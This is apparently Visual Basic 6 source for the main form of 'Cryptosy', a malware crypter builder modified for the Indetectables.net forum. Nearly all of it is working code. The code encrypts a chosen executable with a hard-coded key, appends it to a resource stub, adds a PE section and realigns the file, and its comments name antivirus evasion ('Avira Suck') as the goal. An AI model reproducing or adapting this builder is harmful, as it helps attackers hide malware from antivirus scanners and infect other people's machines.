VERSION 5.00
Begin VB.Form frmMain 
   BackColor       =   &H80000007&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Cryptosy"
   ClientHeight    =   1860
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   5640
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmMain.frx":08CA
   ScaleHeight     =   1860
   ScaleWidth      =   5640
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdAction 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Build"
      Height          =   195
      Index           =   1
      Left            =   2040
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   1320
      Width           =   1575
   End
   Begin VB.CommandButton cmdAction 
      BackColor       =   &H00FFFFFF&
      Caption         =   "..."
      Height          =   195
      Index           =   0
      Left            =   240
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   960
      Width           =   495
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00C0C0C0&
      Enabled         =   0   'False
      Height          =   195
      Left            =   1080
      TabIndex        =   0
      Top             =   960
      Width           =   3495
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H80000007&
      Caption         =   "Mod By ChInOlOo Para Indetectables.net"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000F&
      Height          =   255
      Left            =   360
      TabIndex        =   3
      Top             =   1560
      Width           =   5055
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'#############################################################################################################
'Based On Cobein Cryptosy

Option Explicit

Private Declare Function GetFileNameFromBrowseW Lib "shell32" Alias "#63" (ByVal hwndOwner As Long, ByVal lpstrFile As Long, ByVal nMaxFile As Long, ByVal lpstrInitialDir As Long, ByVal lpstrDefExt As Long, ByVal lpstrFilter As Long, ByVal lpstrTitle As Long) As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const Tit = "W35879HEFWGS" 'Encryption Key
Dim Lpath As String

Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #1
    lFileSize = LOF(1)
    sData = Input$(lFileSize, 1)
    Close #1
    LoadFile = sData
End Function

Private Sub cmdAction_Click(Index As Integer)
    Select Case Index
    
        Case 0
            Dim sSave As String
            sSave = Space(255)
            GetFileNameFromBrowseW Me.hWnd, StrPtr(sSave), 255, StrPtr("c:\"), StrPtr("txt"), StrPtr("Apps (*.EXE)" + Chr$(0) + "*.EXE" + Chr$(0) + "All files (*.*)" + Chr$(0) + "*.*" + Chr$(0)), StrPtr("Select File")
            Text1 = Left$(sSave, lstrlen(sSave))
            
        Case 1
           Dim sBuff As String
            Dim c As New C4
            Dim sSize As String * 8
           Dim gfdsf As String
            gfdsf = ".Kerbero" ' Section Name
            Lpath = App.Path & "\Stub.exe"
            If Not Text1 = vbNullString Then
            
                If PathFileExists(App.Path & "\Crypted.exe") Then
                    Kill App.Path & "\Crypted.exe"
                End If
               If PathFileExists(App.Path & "\Stub.exe") Then
                    Kill App.Path & "\Stub.exe"
              End If
                
                
                
                Open App.Path & "\Stub.exe" For Binary Access Write As #3 'open stub
                Dim bfile() As Byte

                bfile() = LoadResData(101, "STUB") 'load stub
              

                Put #3, , bfile() 'put stub
                  
                AddSection Lpath, gfdsf, 500, &H8  'Add one Section Avira Suck
                
                Close #3 'Close Stub
               
               Open App.Path & "\Crypted.exe" For Binary Access Write As #4 ' Open Crypted File
               
               Dim PT As String
               Dim bfile2 As String
               
               
               
               PT = App.Path & "\Stub.exe"
               
                bfile2 = LoadFile(PT) 'Load MOdified Stub
                
                Put #4, , bfile2 'Put Stub
                
                sBuff = LoadFile(Text1)
                
                sBuff = c.EncryptString(sBuff, Tit) 'Encrypt new Files
              
                 Put #4, , sBuff 'Put Encrypted Data
                
                sSize = Len(sBuff)
                
                Put #4, , sSize
                
                Put #4, , 27
                
                Close #4
                Kill App.Path & "\Stub.exe"
               
               Call Allig 'Realign The Encrypted EXTRA data Avira Suck
            
            End If
          
          End Select
End Sub


Function Allig()

Dim Lpatha As String

Lpatha = App.Path & "\Crypted.exe"
                Call RealignPEFromFile(Lpatha)
                
End Function

